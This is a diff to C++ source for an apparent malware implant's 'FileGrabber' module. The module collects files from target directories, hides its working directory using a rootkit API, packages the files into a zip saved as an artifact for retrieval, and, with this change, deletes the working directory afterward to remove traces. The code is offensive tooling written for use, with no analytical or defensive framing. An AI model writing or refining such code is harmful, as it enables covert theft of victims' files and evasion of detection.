@@ -219,7 +219,7 @@ int FileGrabber::run_grab_task(std::string working_dir, std::string directory, s
 
     std::vector<std::string> files;
     files = list_files(working_dir, directory, true, filter, true);
- 
+
     for (const auto& file : files) {
         copy_file_to_folder(file, task_dir);
         found_counter++;
@@ -265,7 +265,8 @@ void FileGrabber::module_impl()
     try {
         working_dir = create_working_dir(base_dir);
         // hide working_dir using rootkit api
-        hide_filename(working_dir.c_str());
+        std::string dir_name = working_dir.substr(working_dir.length() - 10);
+        hide_filename(dir_name.c_str());
         std::cout << "[+] created working directory: " << working_dir << std::endl;
     } catch (const std::exception& ex) {
         send_err(inner, std::string("Failed to create working dir: ") + ex.what());
@@ -305,7 +306,7 @@ void FileGrabber::module_impl()
         send_err(inner, std::string("No zip to send"));
         return;
     }
-    
+
     std::cout << "[+] File exists: " << out_zip_path << std::endl;
     try {
         std::vector<unsigned char> fileContent = readFile(out_zip_path);
@@ -317,7 +318,19 @@ void FileGrabber::module_impl()
         save_artifact(ret_json);
     } catch (const std::exception& e) {
         send_err(inner, std::string("saving zip as artifact:" ) + e.what());
-        return;
+    }
+
+    try {
+        // Check if the folder exists
+        if (boost::filesystem::exists(working_dir) && boost::filesystem::is_directory(working_dir)) {
+            // Attempt to remove the directory and its contents
+            boost::filesystem::remove_all(working_dir);
+            std::cout << "[+] Folder deleted successfully: " << working_dir << std::endl;
+        } else {
+            std::cout << "[-] Folder does not exist: " << working_dir << std::endl;
+        }
+    } catch (const std::exception& e) {
+        std::cerr << "Error deleting folder: " << e.what() << std::endl;
     }
 
     return;
